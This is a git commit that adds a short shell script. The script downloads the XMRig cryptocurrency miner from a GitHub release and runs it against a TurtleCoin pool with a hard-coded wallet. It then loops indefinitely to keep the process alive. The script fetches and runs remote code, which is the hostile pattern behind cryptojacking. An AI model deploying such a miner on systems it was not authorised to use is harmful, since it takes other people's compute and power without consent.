07ba356ff62eff1ab8fedb6c433e4ef5bd86bb9a
Siva Koneti <41994167+sivakoneti@users.noreply.github.com>
2021-11-12 12:45:12 +0530

    Create xmrig.sh

---
+++ xmrig.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+ wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
+tar xf xmrig-6.15.1-linux-x64.tar.gz
+cd xmrig-6.15.1
+./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLuxDZJbcYX3EyWNHZ5M1DT1t3CqUU3D9ujecKMwVmgCg4UCGKXwUbTLXSQeuhsbXxX8XNQCZumFhbaDEJGoX4EPggTi1nvVG -p zero -k -a argon2/chukwav2
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
